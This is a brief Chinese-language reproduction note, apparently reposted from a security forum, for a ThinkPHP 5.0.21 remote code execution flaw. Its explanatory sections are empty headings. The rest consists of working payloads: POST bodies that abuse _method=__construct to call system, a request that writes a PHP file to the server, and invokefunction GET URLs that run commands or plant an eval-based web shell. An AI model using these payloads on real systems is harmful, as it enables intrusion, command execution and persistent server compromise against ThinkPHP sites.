# Thinkphp 5.0.21

> 原文：[https://www.zhihuifly.com/t/topic/3154](https://www.zhihuifly.com/t/topic/3154)

# Thinkphp 5.0.21

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

三、复现过程

> https://www.0-sec.org/?s=index/index

```
POST 
_method=__construct&filter[]=system&server[REQUEST_METHOD]=calc 
```

> 写shell

```
POST `_method=__construct&filter[]=assert&server[REQUEST_METHOD]=file_put_contents(‘zerosec.php’,’<?php phpinfo();’)` 
```

> 有captcha路由时无需debug=true

> https://www.0-sec.org/?s=captcha/calc

```
POST `_method=__construct&filter[]=system&method=GET

POST ?s=captcha

_method=__construct&filter[]=system&server[REQUEST_METHOD]=calc&method=get>` 
```

### get请求

```
http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 
```

### get请求

```
http://0-sec.org/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 
```

### get请求

```
http://0-sec.org/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=system("whoami"); 
```

### get请求

```
http://0-sec.org/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=eval($_POST[ian]); 
```